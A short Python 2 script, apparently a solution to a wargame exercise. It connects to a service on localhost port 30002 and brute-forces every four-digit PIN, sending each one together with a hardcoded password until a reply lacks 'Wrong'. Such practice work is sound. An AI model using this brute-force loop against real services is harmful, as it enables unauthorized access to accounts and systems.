import socket

def main():
    HOST = "localhost"
    PORT = 30002
    KEY = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
    #SETUP
    s = socket.socket()
    s.connect((HOST,PORT))


    print s.recv(1024)
    
    i0 = 0
    i1 = 0
    i2 = 0
    i3 = 0
    for i0 in xrange(10):
        for i1 in xrange(10):
            for i2 in xrange(10):
                for i3 in xrange(10):
                    val = KEY + " " + str(i0) + str(i1) + str(i2) + str(i3) + "\n"
                    s.send(val)
                    ret =  s.recv(1024)
                    if "Wrong" in ret:
                        pass
                    else:
                        print val
                        print ret
    pass

main()
